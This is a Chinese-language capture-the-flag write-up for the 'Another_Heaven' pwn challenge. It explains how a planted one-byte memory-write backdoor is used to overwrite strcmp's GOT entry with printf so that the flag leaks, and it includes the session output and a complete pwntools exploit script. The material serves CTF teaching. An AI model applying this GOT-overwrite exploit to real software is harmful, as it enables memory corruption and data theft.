- 发现有一个`Pxxxhub`的后门，可修改`1`字节任意内存

    ```c
      puts("There is a back door...\"Hacked by Annevi!\"");
      *addr = readi();
      read(0, *addr, 1uLL);
    ```

- `init()`中读了`flag`，随后有个`strcmp`对比`password`与`flag`

  ```c
    printf("Password:", account);
    read_n(password, 48);
    if ( !strcmp(password, flag) )
    {
      puts("Welcome!The emperor Qie!");
      puts("|Recommended|Hottest|Most Viewed......");
      result = 0;
    }
  ```

- 于是，用后门改写`GOT`表，把`strcmp`改为`printf`，读`password`时，输入`%s`

- `strcmp(password, flag)`相当于执行`printf("%s",flag)`
  
    ```shell
    % nc 47.103.214.163 21001
    There is a back door..."Hacked by Annevi!"
    6299752
    &
    ==========================================
    ____
    |  _ \ ___  _ __ _ __ | | | |_   _| |__  
    | |_) / _ \| '__| '_ \| |_| | | | | '_ \ 
    |  __/ (_) | |  | | | |  _  | |_| | |_) |
|_|   \___/|_|  |_| |_|_| |_|\__,_|_.__/ 
    
    ==========================================
                  Login System
    Account:Password:%s
    hgame{VGhlX2Fub3RoZXJfd2F5X3RvX2hlYXZlbg==}Wrong Password!
Forgot your password?(y/n)
    
    ```
    
- exp

    ```python
    #!/usr/bin/python
    #__author__:TaQini
    
    from pwn import *
    
    local_file  = './Another_Heaven'
    local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
    remote_libc = local_libc # '../libc.so.6'
    
    if len(sys.argv) == 1:
        p = process(local_file)
        libc = ELF(local_libc)
    elif len(sys.argv) > 1:
        if len(sys.argv) == 3:
            host = sys.argv[1]
            port = sys.argv[2]
        else:
            host, port = sys.argv[1].split(':')
        p = remote(host, port)
        libc = ELF(remote_libc)
    
    elf = ELF(local_file)
    
    context.log_level = 'debug'
    context.arch = elf.arch
    
    se      = lambda data               :p.send(data) 
    sa      = lambda delim,data         :p.sendafter(delim, data)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    sea     = lambda delim,data         :p.sendafter(delim, data)
    rc      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, '\0'))
    uu64    = lambda data               :u64(data.ljust(8, '\0'))
    info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
    
    def debug(cmd=''):
        gdb.attach(p,cmd)
    
    #info
    strcmp_got = elf.got['strcmp']
    
    ru('There is a back door..."Hacked by Annevi!"\n')
    sl(str(strcmp_got))
    sl('\x26') # strcmp_got -> printf_got 
    ru('Password:')
    sl('%s') # strcmp(password,flag) -> printf("%s",flag)
    flag = ru('Wrong Password!\n')
    
    log.info('flag is: ' + flag)
    
    p.interactive()
    ```

    